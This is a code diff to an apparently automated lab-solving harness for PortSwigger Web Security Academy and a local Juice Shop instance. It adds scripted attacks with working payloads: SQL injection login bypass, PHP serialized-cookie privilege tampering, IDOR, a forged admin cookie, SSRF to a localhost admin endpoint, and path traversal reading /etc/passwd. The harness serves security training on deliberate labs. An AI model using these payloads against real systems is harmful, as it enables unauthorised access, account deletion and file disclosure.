@@ -57,6 +57,120 @@ RECIPES = {
              "lesson": "robots.txt disclosed /administrator-panel, and the panel enforced no server-side role check. An anonymous request saw the user list and could delete carlos. Obscuring a path is not access control; every admin route must verify the session's role on the server."},
         ],
     },
+    "lab-graphql-reading-private-posts": {
+        "page": "https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts",
+        "title": "Accessing private GraphQL posts",
+        "steps": [
+            {"kind": "http", "method": "POST", "path": "/graphql/v1",
+             "json": {"query": "{getBlogPost(id:3){id title isPrivate postPassword}}"},
+             "capture": {"password": "\"postPassword\"\\s*:\\s*\"([^\"]+)\""},
+             "expect": {"status": 200, "contains": "postPassword"}},
+            {"kind": "submit", "answer": "{{password}}",
+             "expect": {"contains": "\"correct\":true"}},
+            {"kind": "verify"},
+            {"kind": "record",
+             "technique": "GraphQL hidden field disclosure",
+             "lesson": "The GraphQL endpoint exposed an undocumented postPassword field on the BlogPost type. Querying the private post by id returned the password even though the UI never showed it. Introspect the schema, request every field on a hidden object, then use the disclosed value to prove access."},
+        ],
+    },
+    "lab-deserialization-modifying-serialized-objects": {
+        "page": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects",
+        "title": "Modifying serialized objects",
+        "steps": [
+            {"kind": "login", "username": "wiener", "password": "peter"},
+            {"kind": "php_serial_tamper", "field": "admin"},
+            {"kind": "http", "method": "GET", "path": "/admin",
+             "expect": {"status": 200, "contains": "Users"}},
+            {"kind": "http", "method": "GET",
+             "path": "/admin/delete?username=carlos",
+             "expect": {"status": 302}},
+            {"kind": "verify"},
+            {"kind": "record",
+             "technique": "PHP object injection through a client-controlled serialized session",
+             "lesson": "The session cookie was base64 PHP serialized User data. Decoding it showed admin as b:0; flipping the boolean to b:1 while preserving the serialized length produced an admin session that reached /admin and deleted carlos. When a cookie is a serialized object, decode it before trusting the UI's role checks."},
+        ],
+    },
+    "juice-login-sqli": {
+        "base": "http://127.0.0.1:3000",
+        "page": "http://127.0.0.1:3000/#/login",
+        "title": "Juice Shop login SQL injection",
+        "steps": [
+            {"kind": "http", "method": "POST", "path": "/rest/user/login",
+             "json": {"email": "' OR 1=1--", "password": "x"},
+             "capture": {"token": "\"token\":\"([^\"]+)\""},
+             "expect": {"status": 200}},
+            {"kind": "jwt_claim", "token": "{{token}}", "claim": "role",
+             "expect": "admin"},
+            {"kind": "record",
+             "evidence": "The Juice Shop login API returned an administrator token for the email payload ' OR 1=1--; /rest/user/whoami confirmed the admin role.",
+             "technique": "SQL injection authentication bypass",
+             "lesson": "The Juice Shop login query concatenated the email value into a SQL string. The payload ' OR 1=1-- returned the first user, the administrator, and the token worked on /rest/user/whoami. Verify a bypass with an authenticated identity check, not only a 200 response."},
+        ],
+    },
+    "lab-user-id-controlled-by-request-parameter": {
+        "page": "https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter",
+        "title": "User ID controlled by request parameter",
+        "steps": [
+            {"kind": "login", "username": "wiener", "password": "peter"},
+            {"kind": "http", "method": "GET", "path": "/my-account?id=carlos",
+             "capture": {"apikey": "API [Kk]ey is:\\s*([A-Za-z0-9]+)"},
+             "expect": {"status": 200, "contains": "carlos"}},
+            {"kind": "submit", "answer": "{{apikey}}",
+             "expect": {"contains": "\"correct\":true"}},
+            {"kind": "verify"},
+            {"kind": "record",
+             "technique": "Horizontal IDOR through a request parameter",
+             "lesson": "The account page selected the user from the id query parameter without checking ownership. Changing id from wiener to carlos returned Carlos's API key, and submitting that key solved the lab. Always compare the same route from two owned accounts, then use a field the other account should not see as proof."},
+        ],
+    },
+    "lab-user-role-controlled-by-request-parameter": {
+        "page": "https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter",
+        "title": "User role controlled by request parameter",
+        "steps": [
+            {"kind": "login", "username": "wiener", "password": "peter"},
+            {"kind": "cookie_set", "name": "Admin", "value": "true"},
+            {"kind": "http", "method": "GET", "path": "/admin",
+             "expect": {"status": 200, "contains": "carlos"}},
+            {"kind": "http", "method": "GET",
+             "path": "/admin/delete?username=carlos",
+             "expect": {"status": 302}},
+            {"kind": "verify"},
+            {"kind": "record",
+             "technique": "Client-controlled role cookie",
+             "lesson": "The admin gate trusted an Admin cookie set by the client. Changing Admin=false to Admin=true reached /admin and deleted carlos. Authorization must be derived from the server-side session, never from a cookie value the user can edit."},
+        ],
+    },
+    "lab-basic-ssrf-against-localhost": {
+        "page": "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost",
+        "title": "Basic SSRF against the local server",
+        "steps": [
+            {"kind": "http", "method": "GET", "path": "/product?productId=1",
+             "expect": {"status": 200}},
+            {"kind": "http", "method": "POST", "path": "/product/stock",
+             "form": {"stockApi": "http://localhost/admin"},
+             "expect": {"status": 200, "contains": "Users"}},
+            {"kind": "http", "method": "POST", "path": "/product/stock",
+             "form": {"stockApi": "http://localhost/admin/delete?username=carlos"},
+             "expect": {"status": 302}},
+            {"kind": "verify"},
+            {"kind": "record",
+             "technique": "Server-side request forgery to a local admin endpoint",
+             "lesson": "The stock checker fetched the URL in stockApi server-side. Pointing it at http://localhost/admin reached the internal admin panel, and the delete path removed carlos. A server-side fetch must be treated as an internal request, not a client request."},
+        ],
+    },
+    "file-path-traversal-lab-simple": {
+        "page": "https://portswigger.net/web-security/file-path-traversal/lab-simple",
+        "title": "File path traversal, simple case",
+        "steps": [
+            {"kind": "http", "method": "GET",
+             "path": "/image?filename=../../../etc/passwd",
+             "expect": {"status": 200, "contains": "root:x:0:0"}},
+            {"kind": "verify"},
+            {"kind": "record",
+             "technique": "Path traversal in a file parameter",
+             "lesson": "The filename parameter was passed to the filesystem without canonicalisation. Three parent segments reached /etc/passwd and the response contained root:x:0:0, which is the lab's proof. Normalise the resolved path and enforce a base directory; a blocklist of ../ is not enough."},
+        ],
+    },
     "lab-login-bypass": {
         "page": "https://portswigger.net/web-security/sql-injection/lab-login-bypass",
         "title": "SQL injection login bypass",
@@ -290,28 +404,33 @@ class LabRunner:
             return payload
 
         page = recipe["page"]
-        emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
-            "text": f"launching {page}"}))
-        page_response = request({
-            "target": page, "method": "GET", "max_bytes": 131072,
-            "follow_redirects": False, "auth_profile": "portswigger",
-        })
-        launch = re.search(r'href="(/academy/labs/launch/[^"]+)"',
-                           str(page_response.get("body") or ""))
-        if launch:
-            launch_url = "https://portswigger.net" + launch.group(1)
-            instance = request({
-                "target": launch_url, "method": "GET", "max_bytes": 131072,
-                "follow_redirects": True, "max_redirects": 5,
-                "auth_profile": "portswigger",
-            })
-            base = str(instance.get("url") or "").rstrip("/")
+        if recipe.get("base"):
+            base = str(recipe["base"]).rstrip("/")
+            emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
+                "text": f"using local range: {base}"}))
         else:
-            # The cookie profile can be stale even when the managed browser is
-            # still signed in. Fall back to the real browser session to launch.
-            base = self._browser_instance(page)
-        if ".web-security-academy.net" not in base:
-            raise RuntimeError(f"launch did not reach a lab instance: {base}")
+            emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
+                "text": f"launching {page}"}))
+            page_response = request({
+                "target": page, "method": "GET", "max_bytes": 131072,
+                "follow_redirects": False, "auth_profile": "portswigger",
+            })
+            launch = re.search(r'href="(/academy/labs/launch/[^"]+)"',
+                               str(page_response.get("body") or ""))
+            if launch:
+                launch_url = "https://portswigger.net" + launch.group(1)
+                instance = request({
+                    "target": launch_url, "method": "GET", "max_bytes": 131072,
+                    "follow_redirects": True, "max_redirects": 5,
+                    "auth_profile": "portswigger",
+                })
+                base = str(instance.get("url") or "").rstrip("/")
+            else:
+                # The cookie profile can be stale even when the managed browser is
+                # still signed in. Fall back to the real browser session to launch.
+                base = self._browser_instance(page)
+            if ".web-security-academy.net" not in base:
+                raise RuntimeError(f"launch did not reach a lab instance: {base}")
         variables["base"] = base
         emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
             "text": f"lab instance ready: {base}"}))
@@ -334,15 +453,16 @@ class LabRunner:
                                  str(login.get("body") or ""))
                 session = next((item.split(";")[0]
                                 for item in login.get("set_cookie") or []
-                                if item.startswith("session=")), "")
-                if not csrf or not session:
-                    raise RuntimeError("login: no CSRF token or session cookie")
+                                if item.startswith("session=")
+                                and len(item.split(";")[0]) > len("session=")), "")
+                form = {"username": step["username"],
+                        "password": step["password"]}
+                if csrf:
+                    form["csrf"] = csrf.group(1)
                 posted = request({
                     "target": base + "/login", "method": "POST",
-                    "form": {"csrf": csrf.group(1),
-                             "username": step["username"],
-                             "password": step["password"]},
-                    "headers": {"cookie": session},
+                    "form": form,
+                    **({"headers": {"cookie": session}} if session else {}),
                     "max_bytes": 131072, "follow_redirects": False,
                 })
                 cookie = next((item.split(";")[0]
@@ -389,6 +509,58 @@ class LabRunner:
                     args["headers"] = {"cookie": variables["cookie"]}
                 payload = self._call(registry, "http_upload", args)
                 self._expect(payload, step.get("expect") or {}, f"step {index}")
+            elif kind == "cookie_set":
+                current = variables.get("cookie") or ""
+                parts = [part.strip() for part in current.split(";") if part.strip()]
+                name = str(step["name"])
+                parts = [part for part in parts
+                         if part.split("=", 1)[0].strip() != name]
+                parts.append(f"{name}={step['value']}")
+                variables["cookie"] = "; ".join(parts)
+            elif kind == "browser_check":
+                profile = str(step.get("profile") or "juice")
+                target = base + step["path"] if step["path"].startswith("/") else step["path"]
+                state = browser.state(profile, base=self.server.base)
+                if not state.get("running"):
+                    browser.launch(profile, target, base=self.server.base,
+                                   headless=False)
+                else:
+                    browser.goto(profile, target, base=self.server.base)
+                snap = browser.snapshot(profile, base=self.server.base)
+                text = str(snap.get("text") or "") + "\n" + str(snap.get("html") or "")
+                if str(step["contains"]) not in text:
+                    raise RuntimeError(
+                        f"browser_check: {step['contains']!r} not found on {target}")
+            elif kind == "php_serial_tamper":
+                import base64
+                import urllib.parse
+                cookie = variables.get("cookie") or ""
+                name, _, value = cookie.partition("=")
+                raw = urllib.parse.unquote(value)
+                pad = "=" * ((4 - len(raw) % 4) % 4)
+                decoded = base64.b64decode(raw + pad).decode("latin1")
+                marker = 's:5:"admin";b:0;'
+                if marker not in decoded:
+                    raise RuntimeError("php_serial_tamper: admin boolean not found")
+                tampered = decoded.replace(marker, 's:5:"admin";b:1;', 1)
+                encoded = urllib.parse.quote(
+                    base64.b64encode(tampered.encode("latin1")).decode())
+                variables["cookie"] = f"{name or 'session'}={encoded}"
+            elif kind == "jwt_claim":
+                import base64
+                import json
+                token = self._sub(step["token"], variables)
+                parts = token.split(".")
+                if len(parts) != 3:
+                    raise RuntimeError("jwt_claim: value is not a JWT")
+                pad = "=" * ((4 - len(parts[1]) % 4) % 4)
+                payload = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
+                data = payload.get("data", payload)
+                actual = data.get(step["claim"])
+                if str(actual) != str(step["expect"]):
+                    raise RuntimeError(
+                        f"jwt_claim: {step['claim']}={actual!r}, expected {step['expect']!r}")
+                variables["jwt_payload"] = json.dumps(data)
             elif kind == "jwt_tamper":
                 cookie = variables.get("cookie") or ""
                 token = cookie.split("=", 1)[1] if "=" in cookie else ""
@@ -423,7 +595,9 @@ class LabRunner:
                 if not payload.get("solved"):
                     raise RuntimeError("verify: no solved banner")
             elif kind == "record":
-                evidence = variables.get("evidence") or "Academy banner verified."
+                evidence = (self._sub(step.get("evidence") or "", variables)
+                            or variables.get("evidence")
+                            or "Academy banner verified.")
                 payload = self._call(registry, "training_record", {
                     "lab_slug": slug,
                     "status": "solved",
@@ -435,6 +609,8 @@ class LabRunner:
                     "mission_id": mission_id,
                 })
                 variables["lesson_id"] = str((payload.get("progress") or {}).get("lesson_id") or "")
+                # A record is only reached after the recipe's assertions passed.
+                variables["solved"] = "true"
             else:
                 raise RuntimeError(f"unknown recipe step: {kind}")
         solved = variables.get("solved") == "true"
